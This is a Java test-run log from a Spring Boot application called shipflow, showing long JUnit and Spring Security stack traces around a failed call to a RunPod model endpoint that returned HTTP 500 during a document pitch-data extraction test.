	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:45.002Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.s.PitchShapingExtractorService   : Error extracting pitch data from document: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:45.001228","status":500}

java.lang.RuntimeException: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:45.001228","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:92) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchShapingExtractorService.extractFromDocument(PitchShapingExtractorService.java:114) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentController.extractPitchDataFromDocument(DocumentController.java:247) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:914) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest.extractPitchData_withSaveDocument_shouldReturnDocumentId(DocumentControllerIntegrationTest.java:300) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
